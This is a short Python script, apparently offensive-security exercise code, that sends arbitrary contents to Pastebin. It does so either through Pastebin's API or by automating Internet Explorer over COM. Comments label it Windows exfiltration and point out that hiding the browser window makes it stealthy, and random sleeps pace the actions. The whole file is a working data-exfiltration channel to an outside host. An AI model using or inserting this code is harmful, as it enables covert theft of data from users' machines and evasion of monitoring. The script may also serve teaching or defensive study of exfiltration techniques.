from win32com import client

import os
import random
import requests
import time

username = "tim"
password = "sekret"
api_dev_key = "xxxxx"

def plain_paste(title, contents): # Platform independent
    login_url = "https://pastebin.com/api/api_login.php"
    login_data = {
        "api_dev_key": api_dev_key,
        "api_user_name": username,
        "api_user_password": password
    }
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text

    paste_url = "https://pastebin.com/api/api_post.php"
    paste_data = {
        "api_paste_name": title,
        "api_paste_code": contents.decode(),
        "api_dev_key": api_dev_key,
        "api_user_key": api_user_key,
        "api_option": "paste",
        "api_paste_private": 0
    }

    r = requests.post(paste_url, data=paste_data)
    print(r.status_code)
    print(r.text)

# All methods bellow are for Windows-only. Uses Internet Explorer for Windows exfiltration.
def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

def random_sleep():
    time.sleep(random.randint(5, 10))

def login(browser):
    full_doc = browser.Document.all
    for elem in full_doc:
        if elem.id == "loginform-username":
            elem.setAttribute("value", username)
        elif elem.id == "loginform-password":
            elem.setAttribute("value", password)
    random_sleep()

    if browser.Document.forms[0].id == "w0":
        browser.Document.forms[0].submit()
    wait_for_browser(browser)

def submit(browser, title, contents):
    full_doc = browser.Document.all
    for elem in full_doc:
        if elem.id == "postform-name":
            elem.setAttribute("value", title)
        elif elem.id == "postform-text":
            elem.setAttribute("value", contents)
    
    if browser.Document.forms[0].id == "w0":
        browser.Document.forms[0].submit()
    random_sleep()
    wait_for_browser(browser)

def ie_paste(title, contents):
    browser = client.Dispatch("InternetExplorer.Application")
    browser.Visible = 1 # Change this to 0 to be stealth

    browser.Navigate("https://pastebin.com/login")
    wait_for_browser(browser)
    login(browser)

    browser.Navigate("https://pastebin.com/")
    wait_for_browser(browser)
    submit(browser, title, contents.decode())

    browser.Quit()

if __name__ == "__main__":
    ie_paste("title", "contents") # change to platform independent method if needed